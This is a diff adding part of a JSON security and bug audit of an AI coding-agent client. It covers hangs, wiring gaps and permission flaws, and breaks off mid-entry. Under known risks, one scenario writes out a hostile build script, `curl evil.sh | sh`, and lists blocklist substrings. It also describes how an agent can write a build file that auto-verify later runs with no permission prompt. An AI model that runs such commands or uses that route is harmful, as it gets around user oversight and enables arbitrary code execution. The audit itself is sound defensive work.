+                             "fix":  "On escalation, rebuild the system prompt for the target provider (bypass the local fit-guard and small-ctx NOTE โ€” e.g. add a GetSystemPromptAsync(forProvider) overload or invalidate _cachedSystemPrompt with a provider-aware flag), and stop applying the local control-token sanitizer once loopProvider is no longer local."
+                         },
+                         {
+                             "title":  "max_tokens recovery can append an assistant message with ZERO content blocks (thinking-only truncation) โ€” Anthropic rejects empty-content messages with 400, killing the turn",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  1740,
+                             "severity":  "LOGIC",
+                             "kind":  "crash",
+                             "evidence":  "CodeAgentService.cs:1737-1740: `var partialAssistant = new Services.Providers.NativeMessage { Role = \"assistant\" }; if (!string.IsNullOrEmpty(response.TextContent)) partialAssistant.Content.Add(...); nativeMessages.Add(partialAssistant);` โ€” when TextContent is empty the message is added anyway, with an empty Content list. EnsureAlternatingRoles keeps it (role alternates). The Anthropic API requires every message to have non-empty content.",
+                             "scenario":  "ExtendedThinkingEnabled with a generous ThinkingBudgetTokens: the model burns the entire output budget inside the thinking block and stops with stop_reason=max_tokens before emitting any text or tool_use. ThinkingContent is non-empty but TextContent is null โ’ an empty assistant message enters nativeMessages โ’ the continuation request gets HTTP 400 (\u0027all messages must have non-empty content\u0027) โ’ uncaught (only 413 is) โ’ the turn dies with an error bubble instead of continuing.",
+                             "fix":  "Skip adding partialAssistant when it has no blocks, or add a placeholder text block: `if (partialAssistant.Content.Count == 0) partialAssistant.Content.Add(new ContentBlock { Type = \"text\", Text = \"[output truncated before any visible text]\" });`."
+                         },
+                         {
+                             "title":  "ToolCallSalvage fires on ANY final answer containing JSON that mentions a real tool name โ€” example/documentation JSON in prose gets EXECUTED and the model\u0027s actual explanation is discarded",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  1761,
+                             "severity":  "LOGIC",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "CodeAgentService.cs:1759-1775: `if (response.ToolCalls.Count == 0 \u0026\u0026 _settingsService.Settings.LocalToolCallRepairEnabled) { var salvaged = ToolCallSalvage.ExtractFromText(response.TextContent, ...); if (salvaged.Count \u003e 0) { ... response.StopReason = \"tool_use\"; response.TextContent = null; // the \"text\" WAS the tool call` โ€” but ToolCallSalvage.cs:68-76 EnumerateJsonCandidates scans fenced blocks, then EVERY balanced {...} substring, then the whole text; TryReadCall accepts any object with a `name`/`tool`/`action` key resolving to a registered tool. There is no requirement that the JSON dominates the message or that the message lacks surrounding prose.",
+                             "scenario":  "User (local model, repair enabled by default): \u0027explain how your read_file tool works\u0027. The model finishes with prose plus an illustrative snippet: ```json {\"name\": \"read_file\", \"arguments\": {\"path\": \"example.cs\"}}```. Salvage \u0027recovers\u0027 it, the explanation is nulled out (TextContent=null), read_file actually executes on example.cs, and the loop keeps going โ€” turning a finished answer into more tool turns. With write-capable examples ({\"tool\":\"run_command\",...}) a merely-mentioned command becomes a real execution attempt (gated only by the permission layer).",
+                             "fix":  "Only salvage when the message is essentially the tool call: e.g. require the matched JSON region (or fenced block) to cover \u003e80% of the trimmed text, or require the text to start with \u0027{\u0027/\u0027[\u0027/a fence and contain no sentence-like prose outside it; also skip salvage for messages that end with \u0027?\u0027 or contain code-explanation markers."
+                         },
+                         {
+                             "title":  "Mid-loop goal re-injection quotes the WRONG goal whenever BrainX auto-recall fired โ€” the 200-char excerpt is the \u003cbrainx_recall\u003e preamble, not the user\u0027s request",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  1995,
+                             "severity":  "LOGIC",
+                             "kind":  "wiring-gap",
+                             "evidence":  "ExecuteAgenticAsync (line 1032) mutates the message BEFORE the loop sees it: `userMessage = await MaybePrependBrainContextAsync(userMessage, progress, ct);` which returns `\"\u003cbrainx_recall\u003e\\nRelevant prior knowledge from your BrainX knowledge base...\" + lessons + \"\u003c/brainx_recall\u003e\\n\\n\" + userMessage` (lines 1071-1077). Then the reminder (lines 1995-2001): `string goal = userMessage.Replace(\"\\n\", \" \").Trim(); if (goal.Length \u003e 200) goal = goal[..200] + \"โ€ฆ\"; ... Text = $\"[reminder] The user\u0027s request: \\\"{goal}\\\"...\"` โ€” the first 200 chars are entirely the recall header/lessons; the actual request is truncated away.",
+                             "scenario":  "Local small-ctx model, BrainAutoRecallEnabled, task \u0027fix the null check in LlamaServerProvider\u0027. At step 4/8/12 the anti-drift reminder injects: \u0027[reminder] The user\u0027s request: \"\u003cbrainx_recall\u003e Relevant prior knowledge from your BrainX knowledge base (past decisions, bug fixes, lessons). Consult it if helpfulโ€ฆ\"\u0027 โ€” the one mechanism built to stop a weak model from drifting actively feeds it noise instead of the goal. Side effect of the same mutation: LooksNonTrivialTask (line 1536) sees length\u003e200 โ’ plan-first force-tool fires for ANY question once recall hits (and the Thai verb list \u0027เธ—เธณ\u0027 substring-matches \u0027เธ—เธณเนเธก\u0027/why, so pure why-questions force a tool call too).",
+                             "fix":  "Keep the original user message in a separate variable (e.g. `string originalGoal = userMessage;` before the brain prepend in ExecuteAgenticAsync, passed alongside) and use it for both the reminder excerpt and LooksNonTrivialTask; for Thai verbs match with boundaries (exclude \u0027เธ—เธณเนเธก\u0027)."
+                         },
+                         {
+                             "title":  "Iteration-budget exhaustion is silent: FinalResponse falls back to last step\u0027s ResponseText which is \"\" (never null) for tool-only turns โ€” the \u0027Agent reached maximum iterations\u0027 message is dead code",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  2055,
+                             "severity":  "UX",
+                             "kind":  "silent-failure",
+                             "evidence":  "CodeAgentService.cs:2052-2056: `if (!result.Success) { result.StopReason = \"max_iterations\"; result.FinalResponse = result.Steps.LastOrDefault()?.ResponseText ?? \"Agent reached maximum iterations.\"; }` โ€” but line 1726 sets `step.ResponseText = response.TextContent ?? \"\";` so ResponseText is never null once any step ran; on a tool-heavy run the last step\u0027s text is typically \"\" and the `??` never fires. ChatViewModel\u0027s blank-bubble safety net (lines 1755-1762) posts a generic placeholder, but nothing tells the user the step budget ran out. (Same dead `??` in the legacy loop at line 1327.)",
+                             "scenario":  "A 30-step refactor hits MaxAgentIterations=25 mid-edit (or earlier when auto-verify fail/fix cycles consume turns). The loop stops between an edit and its verification; the user sees an empty/generic assistant message with no \u0027ran out of steps โ€” say continue\u0027 hint, and may believe the task finished. Files are left half-modified with no explanation.",
+                             "fix":  "Use `string.IsNullOrWhiteSpace` instead of `??` and append an explicit, localized exhaustion notice: `result.FinalResponse = (lastText + \"\\n\\n\") + (isThai ? \"โ  เธเธฃเธ {N} เธเธฑเนเธเธ—เธตเนเธเธณเธซเธเธ” โ€” เธเธดเธกเธเน \u0027เธ—เธณเธ•เนเธญ\u0027 เน€เธเธทเนเธญเนเธซเนเธ—เธณเธเธฒเธเธ•เนเธญ\" : \"โ  Reached the {N}-step limit before finishing โ€” say \u0027continue\u0027 to resume.\");`"
+                         },
+                         {
+                             "title":  "Step counter lies after escalation extends the budget โ€” status shows \u0027Step 27/25\u0027 because the label uses MaxAgentIterations while the loop runs to iterationBudget",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  1615,
+                             "severity":  "MINOR",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "CodeAgentService.cs:1605 `for (int iteration = 0; iteration \u003c iterationBudget; iteration++)` with line 2023 `iterationBudget = iteration + 1 + EscalationBonusIterations;` (+8), but the status line 1615 interpolates the unchanged property: `$\"Step {iteration + 1}/{MaxAgentIterations} ยท {nativeThinkVerb}...\"`.",
+                             "scenario":  "Local model escalates near exhaustion at step 25/25; the bonus iterations then display as \u0027Step 26/25\u0027, \u0027Step 27/25\u0027 โ€ฆ \u0027Step 33/25\u0027 in the status bar โ€” looks like a runaway loop to the user (who already distrusts the app for hanging).",
+                             "fix":  "Interpolate `iterationBudget` instead of `MaxAgentIterations` in the native loop\u0027s status strings."
+                         },
+                         {
+                             "title":  "Native path has no corrective retry when salvage finds nothing โ€” a weak model\u0027s malformed tool-call JSON is published verbatim as the final answer (legacy path has the nudge, native doesn\u0027t)",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  1780,
+                             "severity":  "MINOR",
+                             "kind":  "wiring-gap",
+                             "evidence":  "CodeAgentService.cs:1780+: after salvage misses, `if (response.ToolCalls.Count == 0) { ... result.FinalResponse = textContent; result.Success = true; break; }` โ€” no equivalent of the legacy loop\u0027s unknown-tool feedback (lines 1239-1259, `unknownToolFeedbackCount \u003c MaxUnknownToolFeedbacks ... \"These tool names are not registered... Re-issue your action\"`). ToolCallSalvage.ExtractFromText returns empty for truncated/single-quoted/invalid JSON (ToolCallSalvage.cs:41 `catch { /* candidate isn\u0027t valid JSON */ }`).",
+                             "scenario":  "A weak local model emits `{\u0027name\u0027: \u0027read_file\u0027, \u0027path\u0027: ...` (single quotes / truncated). JSON.Parse fails for every candidate, salvage returns empty, and the loop ends the turn with the broken JSON fragment shown to the user as the assistant\u0027s answer โ€” one bounded \u0027your tool call was malformed, re-issue it\u0027 nudge (mirroring the legacy path) would have recovered it.",
+                             "fix":  "When ToolCalls.Count==0, salvage failed, and the text matches a tool-call-looking pattern (starts with \u0027{\u0027 or contains \u0027\"name\"/\u0027tool\u0027\u0027), inject one bounded corrective user message (\u0027Your tool call was malformed JSON โ€” re-issue it as valid JSON using one of the provided tools\u0027) and continue, capped like MaxUnknownToolFeedbacks."
+                         }
+                     ]
+    },
+    {
+        "area":  "providers-local",
+        "findings":  [
+                         {
+                             "title":  "SSE read loop sync-blocks the WPF UI thread for the entire prefill โ€” the literal \u0027app hangs\u0027 bug",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\Providers\\LlamaServerProvider.cs",
+                             "line":  393,
+                             "severity":  "CRITICAL",
+                             "kind":  "hang",
+                             "evidence":  "LlamaServerProvider.cs:393 `while (!reader.EndOfStream)` / `var line = await reader.ReadLineAsync(ct);` โ€” identical pattern at OllamaProvider.cs:220. Consumers run on the UI thread: ChatViewModel.cs:2156 `await foreach (var token in _agentService.ChatStreamAsync(history, input, ct))` and ChatViewModel.cs:1743 `var result = await _agentService.ExecuteAgenticAsync(history, input, progress, ct);` โ€” both awaited directly from SendMessage (UI dispatcher context, no Task.Run, no ConfigureAwait(false)), so every segment of the async iterator resumes on the WPF SynchronizationContext.",
+                             "scenario":  "User sends a message to a local model. llama-server/Ollama returns HTTP headers immediately, then sends NOTHING until prompt-eval finishes (tens of seconds to minutes for a 3-4k-token prompt on a mid-range GPU, far longer on CPU). `StreamReader.EndOfStream` performs a SYNCHRONOUS blocking Read when its buffer is empty โ€” executed on the UI thread, it freezes the entire window for the whole prefill and again at every inter-chunk gap during slow generation. The blocking read ignores `ct`, so the Stop button is dead too. This exactly matches the complaint \u0027เธกเธฑเธเธเนเธฒเธ\u0027 (it hangs).",
+                             "fix":  "Never call EndOfStream on a network stream. Replace the loop condition in BOTH providers with `string? line; while ((line = await reader.ReadLineAsync(ct)) != null) { ... }` (ReadLineAsync returns null at EOF). Additionally consider wrapping the whole send path in Task.Run or adding ConfigureAwait(false) throughout the provider iterators so token parsing never runs on the UI thread."
+                         },
+                         {
+                             "title":  "LocalGgufProvider never forwards native tool use โ€” the entire 11-lever weak-model harness is dead on the default local path",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\Providers\\LocalGgufProvider.cs",
+                             "line":  14,
+                             "severity":  "CRITICAL",
+                             "kind":  "wiring-gap",
+                             "evidence":  "LocalGgufProvider.cs:14 `public class LocalGgufProvider : IAiProvider` contains NO override of SupportsNativeToolUse or ChatWithToolsAsync, so the interface defaults apply: IAiProvider.cs:39 `bool SupportsNativeToolUse =\u003e false;` and IAiProvider.cs:54 returns \"Native tool use not supported by this provider.\" The dispatch gate is CodeAgentService.cs:1035 `if (_providerManager.ActiveProvider.SupportsNativeToolUse)`. Worse, startup auto-load FORCES this provider: ChatViewModel.cs:645-646 `if (_providerManager.ActiveProviderType != AiProviderType.Local) await _providerManager.SwitchProviderAsync(AiProviderType.Local);`.",
+                             "scenario":  "User loads a GGUF via \u0027Local GGUF\u0027 (the default; auto-load even switches a LlamaServer user back to Local on every app start). The router puts the model on llama-server (GPU path, commit c95a986), but ActiveProvider is LocalGgufProvider whose SupportsNativeToolUse is false โ’ ExecuteAgenticAsync always takes ExecuteLegacyToolLoopAsync ([ACTION:] text parsing). Plan-first forced toolChoice, ToolCallSalvage, escalation ladder, A2 sampling params, A5 ctx-aware schema subset, and constrained tool_choice decoding all live in ExecuteNativeToolLoopAsync and never execute. The just-landed reliability harness (ee066da) is unreachable for the #1-priority user population.",
+                             "fix":  "In LocalGgufProvider add: `public bool SupportsNativeToolUse =\u003e _activeBackend == Backend.LlamaServer \u0026\u0026 _serverProvider.SupportsNativeToolUse;` and `public Task\u003cNativeToolResponse\u003e ChatWithToolsAsync(...) =\u003e _activeBackend == Backend.LlamaServer ? _serverProvider.ChatWithToolsAsync(...) : \u003cinterface default\u003e;`. (LLamaSharp backend stays on the legacy loop.)"
+                         },
+                         {
+                             "title":  "Ollama actual context window never configured โ€” all ctx math (clamp, A5 subset, prompt gating) compares against a fictional value",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\Providers\\OllamaProvider.cs",
+                             "line":  167,
+                             "severity":  "LOGIC",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "OllamaProvider.cs:167-174 `options = new { temperature..., top_p..., num_predict = numPredict, repeat_penalty..., repeat_last_n... }` โ€” no num_ctx is ever sent (same in ChatWithToolsAsync options dict, lines 310-317). Yet OllamaProvider.cs:160/330 clamp with `ClampMaxTokens((int)settings.ContextSize, ...)`, and CodeAgentService.cs:657-661 (`includeToolDefs = ... contextTokens \u003e= 8000`) plus 1566-1568 (`localSmallCtx = ... (int)_settingsService.Settings.ContextSize \u003c 8000`) gate the tool catalogue and schema subset on the SAME unrelated setting. settings.ContextSize only configures the llama-server `-c` flag โ€” Ollama runs at its own default num_ctx.",
+                             "scenario":  "User sets ContextSize=16384 for their llama-server model, then switches to Ollama (daemon default num_ctx 2048/4096). CluadeX decides the window is \u0027big\u0027: injects the full ~46-tool catalogue + heavy project context and clamps num_predict against 16384. Ollama silently truncates the oldest part of the prompt โ€” the system prompt and tool definitions are the first to go โ€” so the model ignores instructions, hallucinates tools, or replies with garbage: the documented overflow failure mode, reintroduced through the side door.",
+                             "fix":  "Send `options[\"num_ctx\"] = (int)settings.ContextSize` in BOTH OllamaProvider.ChatAsync and ChatWithToolsAsync so the daemon\u0027s real window matches the value all the budgeting/gating math assumes (or query /api/show for the model\u0027s context and use that)."
+                         },
+                         {
+                             "title":  "Idle timeout never resets on the local native tool path (non-streaming, onTextDelta never fires) โ€” slow-but-healthy turns are killed at 120s",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  1668,
+                             "severity":  "LOGIC",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "CodeAgentService.cs:1658+1668: `if (timeoutSec \u003e 0) callCts.CancelAfter(...)` is reset ONLY inside `onTextDelta: token =\u003e { ... CancelAfter ... }`. But LlamaServerProvider.ChatWithToolsAsync sends `[\"stream\"] = false` (LlamaServerProvider.cs:490) and never invokes onTextDelta (parameter unused in the method body, lines 471-523); OllamaProvider.ChatWithToolsAsync likewise (`[\"stream\"] = false`, OllamaProvider.cs:322). The comment at 1650-1652 (\u0027a healthy (even slow) generation is never cut off\u0027) is false for every local tool turn.",
+                             "scenario":  "Agentic turn on a local model with a grown context: prefill of a 10k-token conversation plus generation of a long Edit tool call takes \u003e120s (InteractiveRequestTimeoutSeconds default 120, AppSettings.cs:64) on a mid-range GPU, trivially on CPU fallback. callCts fires โ’ TimeoutException \u0027the model did not respond\u0027 โ’ ChatViewModel\u0027s retry loop re-sends the SAME oversized request 3 times โ’ ~8 minutes of spinner then an error, even though llama-server was generating fine the whole time. User experiences this as \u0027agent mode always times out / hangs\u0027.",
+                             "fix":  "Make the local tool path stream: send stream:true and accumulate OpenAI tool_call deltas from SSE, invoking onTextDelta per chunk (this both feeds the idle reset and gives live UI). Short-term mitigation: skip CancelAfter (or use a much larger absolute cap) when the active provider is a non-streaming local one."
+                         },
+                         {
+                             "title":  "TokenBudget clamps against live settings.ContextSize, not the ctx the server was actually launched with",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\Providers\\LlamaServerProvider.cs",
+                             "line":  364,
+                             "severity":  "LOGIC",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "Launch: LlamaServerProvider.cs:136 `\"-c\", settings.ContextSize.ToString()` (read once at load). Requests: line 364 `int maxTokens = ...ClampMaxTokens((int)settings.ContextSize, approxPromptTokens, settings.MaxTokens);` and line 504 (tool path) re-read the CURRENT setting on every call. Nothing snapshots the loaded ctx. Related: TokenBudget.cs:37 `int roomForGen = Math.Max(floor, ctxSize - approxPromptTokens - margin);` โ€” when the prompt alone already exceeds ctx, the floor (256) still lets the request go out.",
+                             "scenario":  "User loads a model (server starts with -c 4096), then raises ContextSize to 16384 in Settings without reloading (nothing forces a reload). Every subsequent clamp believes there are 16k tokens of room: prompts beyond 4096 are sent, llama-server rejects with \u0027request exceeds the available context size\u0027 (or context-shifts/truncates on older builds โ’ degraded answers). Inverse direction over-clamps output. Also independent of settings changes: once conversation history alone exceeds ctx, the floor=256 path still fires the doomed request instead of compacting first.",
+                             "fix":  "Capture `_loadedContextSize = (int)settings.ContextSize` in LoadModelAsync and clamp every request against the snapshot; expose it so CodeAgentService\u0027s prompt/schema gating uses the same number. When `approxPromptTokens + floor \u003e _loadedContextSize`, trigger proactive compaction (or a clear \u0027context full\u0027 error) instead of sending."
+                         },
+                         {
+                             "title":  "No Exited handler, no Job Object: crashed server shows stale \u0027Ready\u0027, killed app orphans a VRAM-holding zombie",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\Providers\\LlamaServerProvider.cs",
+                             "line":  173,
+                             "severity":  "LOGIC",
+                             "kind":  "silent-failure",
+                             "evidence":  "LlamaServerProvider.cs:173 `_serverProcess = new Process { StartInfo = psi, EnableRaisingEvents = true };` โ€” EnableRaisingEvents is set but NOTHING subscribes to Exited (grep confirms no `Exited +=` in the file; the only one in the repo is McpStdioTransport.cs:69). Cleanup exists only in Dispose/StopServerAsync (`Kill(entireProcessTree: true)`), which never run if the app crashes or is killed. FindFreePort (lines 595-609) silently hops AWAY from a stale server\u0027s port instead of detecting/reaping it.",
+                             "scenario":  "(a) Mid-session CUDA OOM kills llama-server: status bar keeps \u0027Ready: model [GPU]\u0027; the next agentic turn returns \u0027llama-server is not running. Load a model first.\u0027 rendered as a normal assistant reply (line 475-476) with no auto-restart โ€” user thinks the AI is broken. (b) CluadeX crashes or is killed from Task Manager: llama-server.exe survives holding 6-20 GB VRAM. On next launch, FindFreePort hops to 8088 and starts a SECOND server โ’ model load fails OOM or silently offloads fewer layers (slow), and nothing ever reaps the zombie.",
+                             "fix":  "Subscribe `_serverProcess.Exited += ...` โ’ set IsReady=false, SetStatus/RaiseError(\u0027llama-server exited unexpectedly (code N)\u0027), optionally auto-restart once. For orphans: assign the child to a Windows Job Object with JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE at spawn, or at startup kill any running llama-server.exe whose MainModule path is inside our llama-backend folder before loading."
+                         },
+                         {
+                             "title":  "chars/4 token estimate under-counts Thai 2-4x on the in-proc path โ€” the prompt-starvation clamp fails exactly for Thai users",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Helpers\\TokenBudget.cs",
+                             "line":  20,
+                             "severity":  "LOGIC",
+                             "kind":  "hang",
+                             "evidence":  "TokenBudget.cs:19-20 `public static int EstimateTokens(string? text) =\u003e string.IsNullOrEmpty(text) ? 0 : text.Length / 4;` and the same inline math at LlamaInferenceService.cs:440-441 `int approxPromptTokens = prompt.Length / 4; int roomForGen = Math.Max(256, ctxSize - approxPromptTokens - 64);`. The doc comment claims the estimate is \u0027intentionally biased high\u0027 โ€” false for Thai/CJK, where GGUF tokenizers produce ~1 token per 1-2 chars (often per character).",
+                             "scenario":  "Thai-speaking user (the actual user) chats in Thai on the in-process LLamaSharp path with ctx=4096/MaxTokens=4096 defaults. A 6,000-char Thai conversation is estimated at 1,500 tokens but actually tokenizes to ~4,000+ โ’ the clamp leaves MaxTokens huge, prompt + generation overruns the window โ’ the model stalls or emits nothing: the original documented \u0027local chat hangs / never answers\u0027 bug, resurrected for non-Latin input. (The HTTP paths escape this only by accident: JsonSerializer escapes Thai to \\uXXXX before measuring, inflating the char count.)",
+                             "fix":  "Weight non-ASCII: `int est = 0; foreach(char c in text) est += c \u003c 128 ? 1 : 4; return est / 4;` (ASCII ~4 chars/token, non-ASCII ~1 token/char) in both TokenBudget.EstimateTokens and the LlamaInferenceService inline copy โ€” keep the bias in the safe (high) direction."
+                         },
+                         {
+                             "title":  "Tool-incapable llama-server/Ollama returns HTTP error that is rendered as the assistant\u0027s final answer โ€” no fallback to the legacy loop",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\Providers\\LlamaServerProvider.cs",
+                             "line":  511,
+                             "severity":  "UX",
+                             "kind":  "silent-failure",
+                             "evidence":  "LlamaServerProvider.cs:511-519: `if (!response.IsSuccessStatusCode) { ... return new NativeToolResponse { TextContent = $\"llama-server tool call failed ({(int)response.StatusCode}): {...}\", StopReason = \"end_turn\" }; }` โ€” same pattern at OllamaProvider.cs:349-357. In ExecuteNativeToolLoopAsync, ToolCalls.Count == 0 + end_turn means \u0027final response\u0027 (CodeAgentService.cs:1780-1808), so the raw HTTP error becomes the chat answer and the loop exits. BuildOpenAiToolChoice itself is correct OpenAI shape (string for auto/none/required, {type:function,function:{name}} for named โ€” ApiProviderBase.cs:186-202), and only null/\u0027required\u0027 are currently passed (CodeAgentService.cs:1660-1661).",
+                             "scenario":  "User runs an older llama-server build (no tools support โ’ 500 \u0027Unsupported param: tools\u0027), a GGUF whose chat template lacks tool syntax, or an Ollama model without tool capability (400 \u0027model does not support tools\u0027). With LocalNativeToolUseEnabled=true (default), EVERY agentic message instantly \u0027completes\u0027 with \u0027llama-server tool call failed (500): ...\u0027 as the assistant reply. The agent never does anything; the [ACTION:] legacy loop that WOULD work is never tried; no guidance to update llama-backend or disable the toggle.",
+                             "fix":  "Detect tool-unsupported responses (4xx/5xx with \u0027tool\u0027 in the body) in the native loop and degrade gracefully: re-run the turn via ExecuteLegacyToolLoopAsync (or retry once without the tools array), surface a one-time status \u0027model/server lacks native tool support โ€” using text-mode tools\u0027, and optionally persist a per-model flag so subsequent turns skip the failing call."
+                         },
+                         {
+                             "title":  "WaitForServerReady hard 120s cap mislabels slow-loading large models as \u0027incompatible\u0027 and kills the load",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\Providers\\LlamaServerProvider.cs",
+                             "line":  298,
+                             "severity":  "UX",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "LlamaServerProvider.cs:298 `private async Task\u003cbool\u003e WaitForServerReady(CancellationToken ct, int maxWaitMs = 120_000)` and lines 224-227: `await StopServerAsync(); throw new InvalidOperationException(\"llama-server failed to start. Check if the model is compatible.\");`",
+                             "scenario":  "User loads a 30+ GB Q4 70B (or any big model from an HDD / PCIe-constrained eGPU). Weight upload takes \u003e2 minutes; the health endpoint is still 503 at the 120s mark, so the provider KILLS the half-loaded server and reports \u0027Check if the model is compatible\u0027 โ€” a misleading error for a perfectly compatible model. The stderr progress parser (ReportLoadProgress) was demonstrably still reporting layer-offload progress when the process was killed.",
+                             "fix":  "Scale maxWaitMs by model file size (e.g. 60s + 10s/GB), or keep waiting as long as ReportLoadProgress saw a progress line within the last ~30s (the stderr reader already mines these). Differentiate the failure message: process exited โ’ real incompatibility; still loading at deadline โ’ \u0027model is still loading, increase timeout\u0027."
+                         },
+                         {
+                             "title":  "Agentic prose answers generated at ToolCallTemperature 0.2 โ€” robotic final replies in agent mode (plain chat path is clean)",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\Providers\\LlamaServerProvider.cs",
+                             "line":  485,
+                             "severity":  "MINOR",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "LlamaServerProvider.cs:485 `[\"temperature\"] = (double)Math.Min(settings.Temperature, settings.ToolCallTemperature),` plus top_k/min_p/repeat_penalty (486-489) apply to EVERY native-loop turn โ€” including the final no-tool prose answer โ€” because the provider can\u0027t know which turns are tool turns. Plain chat is unaffected: ChatAsync line 372 sends `temperature = (double)settings.Temperature` with no A2 params. ToolCallTemperature default 0.2 (AppSettings.cs:40).",
+                             "scenario":  "User in agentic mode asks a question that ends with a written explanation. The final explanation turn is sampled at temp 0.2 + repeat_penalty, producing terse, repetitive, robotic text compared with the same model in plain-chat mode. Acceptable trade-off for tool-JSON determinism, but it silently changes the model\u0027s voice for every agent-mode reply.",
+                             "fix":  "Pass the toolChoice hint through: when CodeAgentService expects a prose turn (e.g. final summarize step or toolChoice==\"none\"), send chat-temperature instead of the clamped tool sampling; alternatively expose the clamp as a documented setting note so users understand why agent-mode replies differ."
+                         }
+                     ]
+    },
+    {
+        "area":  "known-risks",
+        "findings":  [
+                         {
+                             "title":  "run_command waits for exit BEFORE reading pipes โ€” pipe-buffer deadlock hangs every verbose command (run_build/run_tests/auto-verify all funnel here)",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\AgentToolService.cs",
+                             "line":  1630,
+                             "severity":  "CRITICAL",
+                             "kind":  "hang",
+                             "evidence":  "await process.WaitForExitAsync(cts.Token);\nstdout = await process.StandardOutput.ReadToEndAsync(cts.Token);\nstderr = await process.StandardError.ReadToEndAsync(cts.Token);\nโ€” compare GitService.cs:441-446 which explicitly documents the fix: \"// Read stdout/stderr concurrently to avoid pipe buffer deadlock. If we await WaitForExitAsync first, the process may block filling the pipe buffer\" and starts both ReadToEndAsync tasks BEFORE WaitForExitAsync. ExecutePowerShellAsync (AgentToolService.cs:3629-3631), HookService.cs:294-296, CodeExecutionService.cs:158-163 all do it correctly. ExecuteRunCommandAsync is the only runner with the wait-first order.",
+                             "scenario":  "Any run_command whose child writes more than the ~4KB pipe buffer (dotnet build, npm install, git log, dir /s) blocks on a full stdout pipe; the parent sits in WaitForExitAsync until the timeout CTS fires, kills the process, and returns \"Command timed out (30s limit)\". Worse: ExecuteRunBuildAsync passes timeout_ms=180000 and ExecuteRunTestsAsync 300000, and AutoVerifyAfterEditEnabled defaults TRUE โ€” so after EVERY successful file edit the agent silently runs the detected build, deadlocks for up to 3 minutes, then reports a bogus timeout. The UI shows \u0027Auto-verifying build after edit...\u0027 frozen for minutes per edit. This is almost certainly the user\u0027s \"เธกเธฑเธเธเนเธฒเธ\" (app hangs) complaint. The 2026 audit note \u0027Process deadlocks (git, powershell, hooks) โ’ fixed with concurrent reads\u0027 never covered run_command โ€” it regressed or was never fixed.",
+                             "fix":  "Reorder to the proven pattern used everywhere else in the codebase: var stdoutTask = process.StandardOutput.ReadToEndAsync(cts.Token); var stderrTask = process.StandardError.ReadToEndAsync(cts.Token); await process.WaitForExitAsync(cts.Token); stdout = await stdoutTask; stderr = await stderrTask; (kill + drain in the OperationCanceledException handler). Optionally cap the read with a bounded reader instead of ReadToEndAsync to avoid buffering multi-GB output before the 5000-char truncation at line 1645."
+                         },
+                         {
+                             "title":  "Auto-verify (default ON) executes project-defined build scripts with NO permission prompt and NO PreToolUse hooks โ€” blocklist is not a sufficient guard",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\AgentToolService.cs",
+                             "line":  1499,
+                             "severity":  "CRITICAL",
+                             "kind":  "wiring-gap",
+                             "evidence":  "RunVerifyBuildAsync (AgentToolService.cs:1499-1505): \"System-initiated, so it deliberately bypasses the model permission gate + PreToolUse hooks ... the dangerous-command blocklist inside the runner still applies\" โ€” it calls ExecuteRunBuildAsync(call, ct) directly, never ExecuteToolAsync. DetectBuildCommand (FileSystemService.cs:241,244) returns \"npm run build\" when package.json exists and \"make\" for Makefile. CheckDangerousCommand (AgentToolService.cs:3553-3584) only matches literal command text prefixes/substrings (\"rm -rf /\", \"| rm \", \"invoke-webrequest\"...) โ€” the string \"npm run build\" passes trivially regardless of what the build script actually does. Invocation: CodeAgentService.cs:1958-1969, gated only by AutoVerifyAfterEditEnabled which defaults true (AppSettings.cs:133).",
+                             "scenario":  "(a) User opens an untrusted/cloned repo whose package.json build script is `curl evil.sh | sh`; the agent edits README.md per the user\u0027s request; auto-verify fires `npm run build` with zero prompts โ’ arbitrary code execution. (b) Permission-gate escape: the model write_file\u0027s a Makefile/package.json (user approves what looks like a harmless config diff), then any subsequent edit triggers auto-verify which executes the script โ€” the model has run an arbitrary command without ever producing an \u0027execute\u0027 permission prompt. The codebase\u0027s own comment at 3550 admits the blocklist is \"defense-in-depth, NOT a security boundary โ€” the permission prompt is\", yet this path removes the permission prompt.",
+                             "fix":  "Either (1) route the RESOLVED command through _permissionService.CheckPermission(cmd, \"execute\", \"run_build\") and prompt once per session per command (cache the user\u0027s approval), or (2) restrict zero-prompt auto-verify to a safelist of direct compiler invocations (dotnet build, cargo build, go build, npx tsc --noEmit) and require approval for script-runner commands (npm run *, make, gradle) since those execute repo-controlled code. Also re-check the resolved command whenever a build-definition file (package.json/Makefile/*.csproj) was modified in the same turn."
+                         },
+                         {
+                             "title":  "notebook_edit and hex tools modify files but map to \u0027execute\u0027 scope with non-path resource โ€” write-scoped permission rules and read-before-edit never apply",
